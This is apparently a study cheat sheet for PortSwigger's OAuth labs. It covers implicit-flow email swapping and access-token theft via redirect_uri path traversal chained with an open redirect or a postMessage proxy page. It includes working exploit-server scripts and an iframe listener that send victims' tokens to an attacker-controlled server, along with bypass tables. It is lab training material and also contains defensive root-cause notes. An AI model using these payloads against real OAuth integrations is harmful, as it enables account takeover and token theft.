# OAuth — Implicit flow and open redirect token theft

In the OAuth implicit flow the access token (and user identity) is returned directly in the URL fragment. The blog-style client app POSTs this to its own `/authenticate` endpoint without verifying the token actually belongs to the supplied email. Separately, `redirect_uri` path-traversal combined with an open redirect on the same domain can route a token fragment to an attacker-controlled server.

## Quick reference
```
# Lab 1 — Implicit flow identity swap
POST /authenticate
{"email":"carlos@carlos-montoya.net","username":"carlos","token":"<YOUR-VALID-TOKEN>"}
→ logged in as carlos; use admin panel to delete carlos's account

# Lab 4 — path traversal + open redirect → token theft
# 1. Confirm path traversal in redirect_uri:
GET /auth?...&redirect_uri=https://LAB/oauth-callback/../post?postId=1
# (redirected to blog post — traversal works)

# 2. Confirm open redirect:
GET /post/next?path=https://EXPLOIT-SERVER  → 302 to exploit server

# 3. Chain them:
GET /auth?client_id=CLIENT-ID&redirect_uri=https://LAB/oauth-callback/../post/next?path=https://EXPLOIT-SERVER/exploit&response_type=token&nonce=0&scope=openid%20profile%20email

# 4. Exploit server /exploit:
<script>
if (!document.location.hash) {
  window.location = 'https://oauth-SERVER/auth?client_id=CLIENT-ID&redirect_uri=https://LAB/oauth-callback/../post/next?path=https://EXPLOIT-SERVER/exploit/&response_type=token&nonce=0&scope=openid%20profile%20email'
} else {
  window.location = '/?'+document.location.hash.substr(1)
}
</script>
# → access_token=... in exploit server log

# Lab 5 — proxy page via comment-form postMessage
redirect_uri=https://LAB/oauth-callback/../post/comment/comment-form
# comment-form does: window.parent.postMessage({data:window.location.href}, '*')
# Exploit iframe:
<iframe src="https://oauth-SERVER/auth?...&redirect_uri=https://LAB/oauth-callback/../post/comment/comment-form&response_type=token&..."></iframe>
<script>
window.addEventListener('message', function(e) {
  fetch("/" + encodeURIComponent(e.data.data))
}, false)
</script>
# → /post/comment/comment-form#access_token=... in exploit server log
# Use token: GET /me  Authorization: Bearer <TOKEN>  → API key
```

## Root cause
- **Implicit flow**: server trusts client-POSTed `email` field — no verification that the OAuth token actually belongs to `carlos@carlos-montoya.net`. Attacker holds a valid token for themselves but sends a different email.
- **Path traversal in redirect_uri**: whitelist checks domain only (`https://LAB/oauth-callback*`) so `/oauth-callback/../post/next` passes but routes to `/post/next`.
- **Open redirect**: `/post/next?path=https://...` accepts absolute URLs → token fragment forwarded off-domain.
- **postMessage(*)**: comment form broadcasts `window.location.href` (including `#access_token` fragment) to any origin → attacker iframe captures it.

## Find it
1. Watch the full OAuth flow in Proxy. If a POST to `/authenticate` or `/login` includes `email` and `token` as separate fields: test swapping email to another user's address.
2. Try `redirect_uri=https://LAB/oauth-callback/../anything` — if it 302s to `/anything` without error, path traversal works.
3. Search every page for query-param-driven redirects (`?path=`, `?url=`, `?next=`, `?redirect=`). Test absolute URL.
4. `grep -r "postMessage" /page-source` — if `postMessage(*,...)` found: usable as proxy to exfiltrate fragment.
5. Check `response_type=token` in auth request — implicit flow (fragment returned). `response_type=code` = authorization code flow (different attack path).

## Technique
**Lab 1 (implicit flow bypass):**
1. Log in with own account via OAuth → proxy intercepts POST `/authenticate` with `{"email":"wiener@...","token":"..."}`.
2. Send to Repeater. Change `email` to `carlos@carlos-montoya.net`.
3. Forward → logged in as carlos.

**Lab 4 (path traversal + open redirect):**
1. Confirm `redirect_uri` path traversal: add `/../post?postId=1` — 302 to blog post.
2. Find open redirect: `GET /post/next?path=https://EXPLOIT-SERVER` → 302.
3. Build chained auth URL: `redirect_uri=https://LAB/oauth-callback/../post/next?path=https://EXPLOIT-SERVER/exploit`, `response_type=token`.
4. Exploit server `/exploit`: if no hash, redirect to auth URL; else forward hash as query param.
5. Deliver to victim. Token arrives at exploit server log as `?access_token=...`.
6. `GET /me` with `Authorization: Bearer <TOKEN>` → returns API key.

**Lab 5 (proxy page):**
1. Same path traversal but `redirect_uri=.../post/comment/comment-form` (this page has `postMessage(*)` in source).
2. Exploit page: outer iframe triggers OAuth with comment-form as redirect_uri. Inner listener on `message` event fetches `e.data.data` (URL with fragment) to exploit server.
3. Victim's auth URL → token in comment-form URL → postMessage → listener → exploit server log.
4. Use stolen token to call `/me` → API key.

## Payload arsenal
```javascript
// Lab 1 — implicit flow email swap
// POST /authenticate body:
{"email":"carlos@carlos-montoya.net","username":"carlos","token":"VALID-TOKEN-YOURS"}

// Lab 4 — fragment extraction script (exploit server /exploit)
<script>
if (!document.location.hash) {
  window.location = 'FULL-OAUTH-AUTH-URL-WITH-CHAINED-REDIRECT-URI'
} else {
  window.location = '/?'+document.location.hash.substr(1)
}
</script>

// Lab 5 — postMessage listener
<iframe src="OAUTH-AUTH-URL-WITH-COMMENT-FORM-REDIRECT"></iframe>
<script>
window.addEventListener('message', function(e) {
  fetch("/" + encodeURIComponent(e.data.data))
}, false)
</script>

// Use stolen token
GET /me HTTP/1.1
Authorization: Bearer ACCESS_TOKEN
```

## Bypasses
| Defense | Bypass |
|---|---|
| redirect_uri whitelist (domain) | Path traversal: `/oauth-callback/../post/next` |
| Token in fragment (not accessible server-side) | Open redirect forwards fragment to same-domain page; postMessage leaks it |
| Email validated by format | N/A — swap any valid-format email (e.g. carlos@carlos-montoya.net) |
| HTTPS only redirect_uri | Path traversal stays on same HTTPS domain |

## Exploitation walkthrough
**Lab 1:** Proxy OAuth flow → POST /authenticate → Repeater → change email → forward → admin access → delete carlos.

**Lab 4:** Test redirect_uri traversal → confirm open redirect → chain auth URL → exploit server two-hop script → deliver to victim → grab token from log → GET /me → API key → submit.

**Lab 5:** Find comment-form postMessage(*) → chain redirect_uri to comment-form → exploit iframe + listener → deliver → token in log → GET /me → API key.

## Chaining
- Stolen admin token → `GET /me` → API key → submit solution.
- Admin account takeover → [Access-control](../../Access-control/) (delete users, admin ops).
- Token theft via redirect → same outcome as [CORS](../../CORS/) misconfiguration token leaks.

## Tools
- **Burp Proxy + Repeater** — swap email in POST /authenticate; replay token
- **Exploit server** — host two-hop redirect script and postMessage listener
- **Burp Collaborator** — not needed here (token arrives at exploit server directly)

## Labs

### Authentication bypass via OAuth implicit flow [Apprentice]
POST /authenticate includes `email` and `token` as separate fields with no server-side token→email binding. Change email to `carlos@carlos-montoya.net` in Repeater → logged in as carlos. Key insight: implicit flow clients must verify the token's `sub`/email server-side; trusting the POSTed email allows full identity impersonation.

### Stealing OAuth access tokens via an open redirect [Practitioner]
`redirect_uri` whitelist validates domain only. Path traversal (`/oauth-callback/../post/next`) combined with `/post/next?path=` open redirect chains auth URL to exploit server. `response_type=token` puts token in URL fragment; exploit server script re-routes the fragment as a query param to itself. Key insight: fragment-based tokens survive same-domain redirects; open redirects are the exfil vector.

### Stealing OAuth access tokens via a proxy page [Expert]
Same path traversal, but targets `/post/comment/comment-form` which `postMessage`s `window.location.href` to `*`. Exploit iframe loads OAuth flow pointing at comment-form; sibling listener on `message` event fetches URL (including fragment) to exploit server. Key insight: `postMessage(data, '*')` broadcasts to any parent — an attacker-controlled iframe is a perfect receiver.

## Real-world notes
- Implicit flow is deprecated in OAuth 2.1 in favor of PKCE authorization code flow; still common in older SPA integrations.
- "Email is trusted from the OAuth provider" — only safe if you verify it's in the token's `id_token` JWT claim, not the client-submitted POST body.
- Open redirects on the client app domain are critical severity when combined with OAuth path-traversal because they break redirect_uri domain allowlists.
- `postMessage(data, '*')` is a classic source for token exfiltration; always grep for it in page source during OAuth audits.

## References
- https://portswigger.net/web-security/oauth
- https://portswigger.net/web-security/oauth/grant-types
